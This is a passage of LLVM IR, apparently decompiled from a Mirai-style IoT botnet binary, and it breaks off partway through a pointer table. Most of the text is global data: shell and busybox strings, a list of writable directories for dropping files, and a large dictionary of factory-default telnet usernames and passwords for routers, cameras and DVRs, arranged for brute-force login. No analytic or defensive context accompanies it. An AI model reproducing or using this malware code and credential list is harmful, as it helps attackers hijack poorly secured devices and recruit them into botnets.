source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.3 = constant i32 -352321502
@global_var_23094.7 = global i32 0
@global_var_230a4.8 = global i32* @global_var_23094.7
@global_var_24158.15 = global i32 0
@global_var_23098.18 = global i32 0
@global_var_e5d0.22 = constant i32 -509558771
@global_var_24190.25 = global i32 0
@global_var_24194.26 = local_unnamed_addr global i32 0
@global_var_24198.27 = local_unnamed_addr global i32 0
@global_var_23dec.30 = local_unnamed_addr global i32 4095
@global_var_23de8.33 = global i32 362436
@global_var_18fc0.35 = constant [7 x i8] c"(null)\00"
@global_var_28190.37 = local_unnamed_addr global i32 0
@global_var_18fc8.39 = constant [8 x i8] c"/bin/sh\00"
@global_var_18fd0.41 = constant [3 x i8] c"sh\00"
@global_var_18fd4.43 = constant [3 x i8] c"-c\00"
@global_var_18fd8.46 = constant i32 -1
@global_var_24170.48 = global i32 0
@global_var_193d8.50 = constant [5 x i8] c"PING\00"
@global_var_18fb0.52 = constant [8 x i8] c"busybox\00"
@global_var_18fb8.53 = constant i32 36
@global_var_18fbc.54 = constant i32 35
@global_var_23dac.55 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18fb0.52, i32 0, i32 0), i8* bitcast (i32* @global_var_18fb8.53 to i8*), i8* bitcast (i32* @global_var_18fbc.54 to i8*)]
@global_var_18f78.57 = constant [7 x i8] c"nvalid\00"
@global_var_18f80.58 = constant [6 x i8] c"ailed\00"
@global_var_18f88.59 = constant [9 x i8] c"ncorrect\00"
@global_var_18f94.60 = constant [6 x i8] c"enied\00"
@global_var_18f9c.61 = constant [5 x i8] c"rror\00"
@global_var_18fa4.62 = constant [7 x i8] c"oodbye\00"
@global_var_18fac.63 = constant [4 x i8] c"bad\00"
@global_var_23d8c.64 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f78.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f80.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18f88.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f94.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18f9c.61, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18fa4.62, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18fac.63, i32 0, i32 0)]
@global_var_24178.66 = global i32 0
@global_var_2417c.67 = local_unnamed_addr global i32 0
@global_var_2a3fc.69 = global i32 0
@global_var_193e0.71 = constant [6 x i8] c":>%$#\00"
@global_var_193e8.78 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_2a3f0.80 = global i32 0
@global_var_18efc.82 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_18f0c.83 = constant [6 x i8] c"/tmp/\00"
@global_var_18f14.84 = constant [6 x i8] c"/var/\00"
@global_var_18f1c.85 = constant [6 x i8] c"/dev/\00"
@global_var_18f24.86 = constant [10 x i8] c"/var/run/\00"
@global_var_18f30.87 = constant [10 x i8] c"/dev/shm/\00"
@global_var_18f3c.88 = constant [6 x i8] c"/mnt/\00"
@global_var_18f44.89 = constant [7 x i8] c"/boot/\00"
@global_var_18f4c.90 = constant [6 x i8] c"/usr/\00"
@global_var_18f54.91 = constant [6 x i8] c"/opt/\00"
@global_var_23d4c.92 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_18efc.82, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f0c.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f14.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f1c.85, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18f24.86, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18f30.87, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f3c.88, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f44.89, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f4c.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f54.91, i32 0, i32 0)]
@global_var_23d78 = external global i32
@global_var_183e4.99 = constant [7 x i8] c"telnet\00"
@global_var_183ec.100 = constant [5 x i8] c"root\00"
@global_var_183f4.101 = constant [8 x i8] c"default\00"
@global_var_18400.102 = constant [7 x i8] c"daemon\00"
@global_var_18408.103 = constant [8 x i8] c"support\00"
@global_var_18414.104 = constant i32 0
@global_var_18418.105 = constant [7 x i8] c"123456\00"
@global_var_18420.106 = constant [7 x i8] c"Zte521\00"
@global_var_18428.107 = constant [6 x i8] c"vizxv\00"
@global_var_18430.108 = constant [8 x i8] c"support\00"
@global_var_18440.109 = constant [6 x i8] c"admin\00"
@global_var_18448.110 = constant [7 x i8] c"camera\00"
@global_var_18450.111 = constant [5 x i8] c"1234\00"
@global_var_18458.112 = constant [10 x i8] c"fliradmin\00"
@global_var_18464.113 = constant [4 x i8] c"jvc\00"
@global_var_1846c.114 = constant [8 x i8] c"meinsma\00"
@global_var_18478.115 = constant [9 x i8] c"password\00"
@global_var_18484.116 = constant [11 x i8] c"supervisor\00"
@global_var_18490.117 = constant [9 x i8] c"backdoor\00"
@global_var_1849c.118 = constant [7 x i8] c"atc123\00"
@global_var_184a4.119 = constant [7 x i8] c"ascend\00"
@global_var_184ac.120 = constant [11 x i8] c"epicrouter\00"
@global_var_184b8.121 = constant [5 x i8] c"none\00"
@global_var_184c0.122 = constant [9 x i8] c"1234User\00"
@global_var_184cc.123 = constant [12 x i8] c"5678Service\00"
@global_var_184dc.124 = constant [9 x i8] c"atlantis\00"
@global_var_184e8.125 = constant [8 x i8] c"ROOT500\00"
@global_var_184f4.126 = constant [7 x i8] c"xxyyzz\00"
@global_var_184fc.127 = constant [7 x i8] c"danger\00"
@global_var_18504.128 = constant [7 x i8] c"crftpw\00"
@global_var_1850c.129 = constant [7 x i8] c"cms500\00"
@global_var_18514.130 = constant [15 x i8] c"ggdaseuaimhrke\00"
@global_var_18524.131 = constant [8 x i8] c"tslinux\00"
@global_var_18530.132 = constant [5 x i8] c"pass\00"
@global_var_18538.133 = constant [7 x i8] c"NetICs\00"
@global_var_18540.134 = constant [9 x i8] c"security\00"
@global_var_1854c.135 = constant [7 x i8] c"friend\00"
@global_var_18554.136 = constant [8 x i8] c"manager\00"
@global_var_18560.137 = constant [7 x i8] c"bintec\00"
@global_var_18568.138 = constant [8 x i8] c"articon\00"
@global_var_18574.139 = constant [7 x i8] c"patrol\00"
@global_var_1857c.140 = constant [8 x i8] c"service\00"
@global_var_18588.141 = constant [5 x i8] c"tech\00"
@global_var_18590.142 = constant [5 x i8] c"live\00"
@global_var_18598.143 = constant [7 x i8] c"Master\00"
@global_var_185a0.144 = constant [7 x i8] c"laflaf\00"
@global_var_185a8.145 = constant [9 x i8] c"Helpdesk\00"
@global_var_185b4.146 = constant [6 x i8] c"Super\00"
@global_var_185bc.147 = constant [10 x i8] c"installer\00"
@global_var_185c8.148 = constant [9 x i8] c"fivranne\00"
@global_var_185d4.149 = constant [9 x i8] c"webadmin\00"
@global_var_185e0.150 = constant [9 x i8] c"Serv4EMC\00"
@global_var_185ec.151 = constant [7 x i8] c"access\00"
@global_var_185f4.152 = constant [9 x i8] c"netadmin\00"
@global_var_18600.153 = constant [9 x i8] c"mediator\00"
@global_var_1860c.154 = constant [8 x i8] c"Mau'dib\00"
@global_var_18618.155 = constant [7 x i8] c"cellit\00"
@global_var_18620.156 = constant [8 x i8] c"diamond\00"
@global_var_1862c.157 = constant [10 x i8] c"1234admin\00"
@global_var_18638.158 = constant [9 x i8] c"changeme\00"
@global_var_18644.159 = constant [7 x i8] c"attack\00"
@global_var_1864c.160 = constant [7 x i8] c"cmaker\00"
@global_var_18654.161 = constant [18 x i8] c"changeme2database\00"
@global_var_18668.162 = constant [5 x i8] c"NULL\00"
@global_var_18670.163 = constant [6 x i8] c"Cisco\00"
@global_var_18678.164 = constant [6 x i8] c"cisco\00"
@global_var_18680.165 = constant [8 x i8] c"blender\00"
@global_var_1868c.166 = constant [7 x i8] c"hsasdb\00"
@global_var_18694.167 = constant [7 x i8] c"wlsedb\00"
@global_var_1869c.168 = constant [13 x i8] c"wlsepassword\00"
@global_var_186ac.169 = constant [7 x i8] c"system\00"
@global_var_186b4.170 = constant [8 x i8] c"cgadmin\00"
@global_var_186c0.171 = constant [5 x i8] c"surt\00"
@global_var_186c8.172 = constant [5 x i8] c"tini\00"
@global_var_186d0.173 = constant [5 x i8] c"any@\00"
@global_var_186d8.174 = constant [6 x i8] c"davox\00"
@global_var_186e0.175 = constant [7 x i8] c"calvin\00"
@global_var_186e8.176 = constant [10 x i8] c"my_DEMARC\00"
@global_var_186f4.177 = constant [8 x i8] c"MServer\00"
@global_var_18700.178 = constant [4 x i8] c"PBX\00"
@global_var_18708.179 = constant [8 x i8] c"NETWORK\00"
@global_var_18714.180 = constant [7 x i8] c"BRIDGE\00"
@global_var_1871c.181 = constant [14 x i8] c"michaelangelo\00"
@global_var_1872c.182 = constant [13 x i8] c"wrgg15_di524\00"
@global_var_1873c.183 = constant [9 x i8] c"firmware\00"
@global_var_18748.184 = constant [10 x i8] c"1234Admin\00"
@global_var_18754.185 = constant [11 x i8] c"software01\00"
@global_var_18760.186 = constant [15 x i8] c"Administration\00"
@global_var_18770.187 = constant [8 x i8] c"su@psir\00"
@global_var_1877c.188 = constant [8 x i8] c"4getme2\00"
@global_var_18788.189 = constant [9 x i8] c"tiger123\00"
@global_var_18794.190 = constant [5 x i8] c"help\00"
@global_var_1879c.191 = constant [10 x i8] c"extendnet\00"
@global_var_187a8.192 = constant [8 x i8] c"Exabyte\00"
@global_var_187b4.193 = constant [9 x i8] c"Posterie\00"
@global_var_187c0.194 = constant [8 x i8] c"!manage\00"
@global_var_187cc.195 = constant [7 x i8] c"radius\00"
@global_var_187d4.196 = constant [9 x i8] c"nimdaten\00"
@global_var_187e0.197 = constant [5 x i8] c"isee\00"
@global_var_187e8.198 = constant [11 x i8] c"56789Admin\00"
@global_var_187f4.199 = constant [11 x i8] c"specialist\00"
@global_var_18800.200 = constant [7 x i8] c"public\00"
@global_var_18808.201 = constant [7 x i8] c"secret\00"
@global_var_18810.202 = constant [7 x i8] c"abc123\00"
@global_var_18818.203 = constant [10 x i8] c"P@55w0rd!\00"
@global_var_18824.204 = constant [8 x i8] c"iDirect\00"
@global_var_18830.205 = constant [6 x i8] c"pilou\00"
@global_var_18838.206 = constant [6 x i8] c"setup\00"
@global_var_18840.207 = constant [6 x i8] c"hello\00"
@global_var_18848.208 = constant [9 x i8] c"adslroot\00"
@global_var_18854.209 = constant [14 x i8] c"administrator\00"
@global_var_18864.210 = constant [14 x i8] c"Administrator\00"
@global_var_18874.211 = constant [7 x i8] c"0Admin\00"
@global_var_1887c.212 = constant [9 x i8] c"123Admin\00"
@global_var_18888.213 = constant [12 x i8] c"123456Admin\00"
@global_var_18898.214 = constant [14 x i8] c"123456special\00"
@global_var_188a8.215 = constant [10 x i8] c"superuser\00"
@global_var_188b4.216 = constant [8 x i8] c"admin00\00"
@global_var_188c0.217 = constant [8 x i8] c"orion99\00"
@global_var_188cc.218 = constant [8 x i8] c"tivonpw\00"
@global_var_188d8.219 = constant [7 x i8] c"Ascend\00"
@global_var_188e0.220 = constant [6 x i8] c"super\00"
@global_var_188e8.221 = constant [12 x i8] c"lucenttech1\00"
@global_var_188f8.222 = constant [13 x i8] c"AitbISP4eCiG\00"
@global_var_18908.223 = constant [6 x i8] c"smile\00"
@global_var_18910.224 = constant [7 x i8] c"router\00"
@global_var_18918.225 = constant [9 x i8] c"motorola\00"
@global_var_18924.226 = constant [7 x i8] c"sysadm\00"
@global_var_1892c.227 = constant [7 x i8] c"NetVCR\00"
@global_var_18934.228 = constant [11 x i8] c"xdfk9874t3\00"
@global_var_18940.229 = constant [5 x i8] c"4tas\00"
@global_var_18948.230 = constant [6 x i8] c"maint\00"
@global_var_18950.231 = constant [6 x i8] c"m1122\00"
@global_var_18958.232 = constant [8 x i8] c"3ep5w2u\00"
@global_var_18964.233 = constant [9 x i8] c"ntacdmax\00"
@global_var_18970.234 = constant [9 x i8] c"PlsChgMe\00"
@global_var_1897c.235 = constant [8 x i8] c"private\00"
@global_var_18988.236 = constant [14 x i8] c"smallbusiness\00"
@global_var_18998.237 = constant [3 x i8] c"mu\00"
@global_var_1899c.238 = constant [14 x i8] c"microbusiness\00"
@global_var_189ac.239 = constant [8 x i8] c"pfsense\00"
@global_var_189b8.240 = constant [8 x i8] c"hawk201\00"
@global_var_189c4.241 = constant [8 x i8] c"h179350\00"
@global_var_189d0.242 = constant [3 x i8] c"lp\00"
@global_var_189d4.243 = constant [8 x i8] c"radware\00"
@global_var_189e0.244 = constant [9 x i8] c"trancell\00"
@global_var_189ec.245 = constant [10 x i8] c"Col2ogro2\00"
@global_var_189f8.246 = constant [9 x i8] c"p1nacate\00"
@global_var_18a04.247 = constant [7 x i8] c"col1ma\00"
@global_var_18a0c.248 = constant [10 x i8] c"d1scovery\00"
@global_var_18a18.249 = constant [6 x i8] c"w2402\00"
@global_var_18a20.250 = constant [6 x i8] c"Sharp\00"
@global_var_18a28.251 = constant [9 x i8] c"engineer\00"
@global_var_18a34.252 = constant [8 x i8] c"ganteng\00"
@global_var_18a40.253 = constant [9 x i8] c"smcadmin\00"
@global_var_18a4c.254 = constant [10 x i8] c"barricade\00"
@global_var_18a58.255 = constant [10 x i8] c"highspeed\00"
@global_var_18a64.256 = constant [15 x i8] c"w0rkplac3rul3s\00"
@global_var_18a74.257 = constant [11 x i8] c"stratauser\00"
@global_var_18a80.258 = constant [6 x i8] c"Admin\00"
@global_var_18a88.259 = constant [8 x i8] c"mysweex\00"
@global_var_18a94.260 = constant [7 x i8] c"symbol\00"
@global_var_18a9c.261 = constant [8 x i8] c"mercury\00"
@global_var_18aa8.262 = constant [9 x i8] c"truetime\00"
@global_var_18ab4.263 = constant [11 x i8] c"12345Admin\00"
@global_var_18ac0.264 = constant [7 x i8] c"master\00"
@global_var_18ac8.265 = constant [5 x i8] c"xbox\00"
@global_var_18ad0.266 = constant [10 x i8] c"tellabs#1\00"
@global_var_18adc.267 = constant [8 x i8] c"admin_1\00"
@global_var_18ae8.268 = constant [7 x i8] c"talent\00"
@global_var_18af0.269 = constant [8 x i8] c"imss7.0\00"
@global_var_18afc.270 = constant [8 x i8] c"detmond\00"
@global_var_18b08.271 = constant [10 x i8] c"1111Admin\00"
@global_var_18b14.272 = constant [11 x i8] c"22222Admin\00"
@global_var_18b20.273 = constant [8 x i8] c"x-admin\00"
@global_var_18b2c.274 = constant [7 x i8] c"switch\00"
@global_var_18b34.275 = constant [9 x i8] c"zoomadsl\00"
@global_var_18b40.276 = constant [9 x i8] c"expert03\00"
@global_var_18b4c.277 = constant [5 x i8] c"anko\00"
@global_var_18b54.278 = constant [11 x i8] c"oelinux123\00"
@global_var_18b60.279 = constant [7 x i8] c"alpine\00"
@global_var_18b68.280 = constant [8 x i8] c"maxided\00"
@global_var_18b74.281 = constant [10 x i8] c"raspberry\00"
@global_var_18b80.282 = constant [8 x i8] c"vagrant\00"
@global_var_18b8c.283 = constant [6 x i8] c"zlxx.\00"
@global_var_18b94.284 = constant [9 x i8] c"juantech\00"
@global_var_18ba0.285 = constant [7 x i8] c"avtech\00"
@global_var_18ba8.286 = constant [7 x i8] c"xc3511\00"
@global_var_18bb0.287 = constant [7 x i8] c"666666\00"
@global_var_18bb8.288 = constant [7 x i8] c"888888\00"
@global_var_18bc0.289 = constant [7 x i8] c"111111\00"
@global_var_18bc8.290 = constant [9 x i8] c"bayandsl\00"
@global_var_18bd4.291 = constant [12 x i8] c"12345676890\00"
@global_var_18be4.292 = constant [11 x i8] c"1234567890\00"
@global_var_18bf0.293 = constant [13 x i8] c"admintelecom\00"
@global_var_18c00.294 = constant [13 x i8] c"telecomadmin\00"
@global_var_18c10.295 = constant [7 x i8] c"comcom\00"
@global_var_18c18.296 = constant [8 x i8] c"zte9x15\00"
@global_var_18c24.297 = constant [6 x i8] c"ZXDSL\00"
@global_var_18c2c.298 = constant [7 x i8] c"D-Link\00"
@global_var_18c34.299 = constant [6 x i8] c"dlink\00"
@global_var_18c3c.300 = constant [6 x i8] c"DLink\00"
@global_var_18c44.301 = constant [12 x i8] c"asteriskftp\00"
@global_var_18c54.302 = constant [9 x i8] c"dreambox\00"
@global_var_18c60.303 = constant [5 x i8] c"1111\00"
@global_var_18c68.304 = constant [6 x i8] c"12345\00"
@global_var_18c70.305 = constant [6 x i8] c"54321\00"
@global_var_18c78.306 = constant [7 x i8] c"fucker\00"
@global_var_18c80.307 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_18c90.308 = constant [13 x i8] c"7ujMko0vizxv\00"
@global_var_18ca0.309 = constant [7 x i8] c"hi3518\00"
@global_var_18ca8.310 = constant [7 x i8] c"klv123\00"
@global_var_18cb0.311 = constant [8 x i8] c"klv1234\00"
@global_var_18cbc.312 = constant [8 x i8] c"realtek\00"
@global_var_18cc8.313 = constant [6 x i8] c"jvbzd\00"
@global_var_18cd0.314 = constant [8 x i8] c"xmhdipc\00"
@global_var_18cdc.315 = constant [9 x i8] c"openlgtv\00"
@global_var_18ce8.316 = constant [8 x i8] c"root123\00"
@global_var_18cf4.317 = constant [9 x i8] c"ahetzip8\00"
@global_var_18d00.318 = constant [7 x i8] c"696969\00"
@global_var_18d08.319 = constant [9 x i8] c"pa55w0rd\00"
@global_var_18d14.320 = constant [7 x i8] c"123123\00"
@global_var_18d1c.321 = constant [9 x i8] c"b120root\00"
@global_var_18d28.322 = constant [9 x i8] c"PASSWORD\00"
@global_var_18d34.323 = constant [6 x i8] c"ADMIN\00"
@global_var_18d3c.324 = constant [8 x i8] c"netgear\00"
@global_var_18d48.325 = constant [7 x i8] c"vyatta\00"
@global_var_18d50.326 = constant [7 x i8] c"atc456\00"
@global_var_18d58.327 = constant [7 x i8] c"micros\00"
@global_var_18d60.328 = constant [8 x i8] c"comcast\00"
@global_var_18d6c.329 = constant [4 x i8] c"pos\00"
@global_var_18d74.330 = constant [4 x i8] c"www\00"
@global_var_18d7c.331 = constant [5 x i8] c"2800\00"
@global_var_18d84.332 = constant [5 x i8] c"UBNT\00"
@global_var_18d8c.333 = constant [9 x i8] c"00000000\00"
@global_var_18d98.334 = constant [5 x i8] c"user\00"
@global_var_18da0.335 = constant [5 x i8] c"ikwb\00"
@global_var_18da8.336 = constant [5 x i8] c"ubnt\00"
@global_var_18db0.337 = constant [4 x i8] c"buh\00"
@global_var_18db8.338 = constant [7 x i8] c"utstar\00"
@global_var_18dc0.339 = constant [9 x i8] c"99999999\00"
@global_var_18dcc.340 = constant [6 x i8] c"Meins\00"
@global_var_18dd4.341 = constant [4 x i8] c"JVC\00"
@global_var_18ddc.342 = constant [5 x i8] c"ip20\00"
@global_var_18de4.343 = constant [7 x i8] c"ip3000\00"
@global_var_18dec.344 = constant [6 x i8] c"ip400\00"
@global_var_18df4.345 = constant [8 x i8] c"tsunami\00"
@global_var_18e00.346 = constant [7 x i8] c"2601hx\00"
@global_var_18e08.347 = constant [7 x i8] c"synnet\00"
@global_var_18e10.348 = constant [6 x i8] c"quser\00"
@global_var_18e18.349 = constant [8 x i8] c"Manager\00"
@global_var_18e24.350 = constant [8 x i8] c"netopia\00"
@global_var_18e30.351 = constant [8 x i8] c"anicust\00"
@global_var_18e3c.352 = constant [10 x i8] c"d.e.b.u.g\00"
@global_var_18e48.353 = constant [5 x i8] c"echo\00"
@global_var_18e50.354 = constant [5 x i8] c"demo\00"
@global_var_18e58.355 = constant [7 x i8] c"client\00"
@global_var_18e60.356 = constant [6 x i8] c"CISCO\00"
@global_var_18e68.357 = constant [8 x i8] c"7654321\00"
@global_var_18e74.358 = constant [9 x i8] c"adsl1234\00"
@global_var_18e80.359 = constant [5 x i8] c"toor\00"
@global_var_18e88.360 = constant [9 x i8] c"adminttd\00"
@global_var_18e94.361 = constant [9 x i8] c"PlcmSpIp\00"
@global_var_18ea0.362 = constant [9 x i8] c"11111111\00"
@global_var_18eac.363 = constant [9 x i8] c"22222222\00"
@global_var_18eb8.364 = constant [9 x i8] c"mountsys\00"
@global_var_18ec4.365 = constant [14 x i8] c"LSiuY7pOmZG2s\00"
@global_var_18ed4.366 = constant [15 x i8] c"3UJUh2VemEfUte\00"
@global_var_18ee4.367 = constant [11 x i8] c"Muse!Admin\00"
@global_var_18ef0.368 = constant [10 x i8] c"changeme2\00"
@global_var_23144.369 = global [769 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_183e4.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_183f4.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18400.102, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18408.103, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_183ec.100, i32 0, i32 0), i8* getelementptr inbounds 